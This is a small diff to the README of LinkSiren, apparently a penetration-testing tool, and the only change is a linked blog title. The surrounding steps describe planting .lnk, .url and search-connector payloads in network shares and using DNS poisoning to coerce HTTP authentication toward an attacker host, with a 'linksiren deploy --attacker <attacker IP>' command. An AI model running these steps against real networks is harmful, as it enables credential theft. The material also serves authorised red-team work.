@@ -71,7 +71,7 @@ linksiren cleanup [domain]/username[:password]
 linksiren identify --targets targets.txt [domain]/username[:password]
 ```
 
-3. Use LinkSiren to deploy payloads to the locations identified in step 2. Optionally, specify a payload name and extension. The payload type (.searchConnector-ms, .library-ms, .lnk, or .url) will be selected automatically from the extension. Folders where payloads were successfully written are saved to `payloads_written.txt`. Use the hostname or DNS name of the attacker host and perform poisoning as necessary to get intranet zoned, as described in my [blog post](https://alittleinsecure.com/dns-hijacking-say-my-name/) and [theHackerRecipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse), to coerce HTTP authentication.
+3. Use LinkSiren to deploy payloads to the locations identified in step 2. Optionally, specify a payload name and extension. The payload type (.searchConnector-ms, .library-ms, .lnk, or .url) will be selected automatically from the extension. Folders where payloads were successfully written are saved to `payloads_written.txt`. Use the hostname or DNS name of the attacker host and perform poisoning as necessary to get intranet zoned, as described in my blog post [DNS Hijacking: Say My Name](https://alittleinsecure.com/dns-hijacking-say-my-name/) and [theHackerRecipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse), to coerce HTTP authentication.
 ```bash
 linksiren deploy --attacker <attacker IP> [domain]/username[:password]
 ```
